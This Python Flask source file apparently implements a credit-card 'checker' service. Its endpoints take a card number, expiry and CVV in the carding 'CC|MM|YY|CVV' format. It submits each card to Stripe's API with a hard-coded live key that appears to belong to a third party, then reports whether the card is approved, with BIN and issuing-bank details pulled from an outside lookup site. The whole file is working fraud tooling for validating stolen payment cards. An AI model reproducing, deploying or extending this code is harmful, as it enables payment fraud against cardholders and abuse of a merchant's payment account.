from flask import Flask, request, jsonify
import requests
import re

app = Flask(__name__)

def check_card_stripe(cc, mm, yy, cvv):
    """Direct Stripe card validation"""
    try:
        if len(yy) == 4:
            yy = yy[-2:]
        
        session = requests.Session()
        session.headers.update({
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Direct Stripe API call
        payload = {
            'type': 'card',
            'card[number]': cc,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'card[cvc]': cvv,
            'key': 'pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy'
        }
        
        response = session.post('https://api.stripe.com/v1/payment_methods', data=payload, timeout=15)
        
        if response.status_code == 200:
            return {"status": "Approved", "response": "Card accepted", "decline_type": "none"}
        
        elif response.status_code == 402:
            error = response.json().get('error', {})
            return {
                "status": "Declined",
                "response": error.get('message', 'Card declined'),
                "decline_type": error.get('code', 'card_decline')
            }
        
        elif response.status_code == 400:
            error = response.json().get('error', {})
            return {
                "status": "Declined",
                "response": error.get('message', 'Invalid card'),
                "decline_type": "invalid_card"
            }
        
        else:
            return {"status": "Declined", "response": "Error processing card", "decline_type": "process_error"}
    
    except Exception as e:
        return {"status": "Declined", "response": str(e), "decline_type": "process_error"}

def get_bin_info(bin_number):
    """Get BIN information"""
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=5)
        return response.json() if response.status_code == 200 else {}
    except:
        return {}

@app.route('/st', methods=['GET'])
def check_card_st():
    """Card checker endpoint: /st?card=4553880143261111|07|2028|173"""
    card_str = request.args.get('card')
    
    if not card_str:
        return jsonify({"error": "Invalid request", "message": "Use: ?card=CCCCCCCCCCCCCCCC|MM|YY|CVV"}), 400

    match = re.match(r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})', card_str)
    if not match:
        return jsonify({"error": "Invalid format", "message": "Use: CCCCCCCCCCCCCCCC|MM|YY|CVV"}), 400

    cc, mm, yy, cvv = match.groups()
    result = check_card_stripe(cc, mm, yy, cvv)
    bin_info = get_bin_info(cc[:6])
    
    return jsonify({
        "status": result["status"],
        "response": result["response"],
        "decline_type": result["decline_type"],
        "bin_info": {
            "brand": bin_info.get('brand', 'Unknown'),
            "type": bin_info.get('type', 'Unknown'),
            "country": bin_info.get('country_name', 'Unknown'),
            "country_flag": bin_info.get('country_flag', ''),
            "bank": bin_info.get('bank', 'Unknown'),
        }
    })

@app.route('/check', methods=['GET'])
def check_card():
    """Alias endpoint"""
    return check_card_st()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000, debug=False)
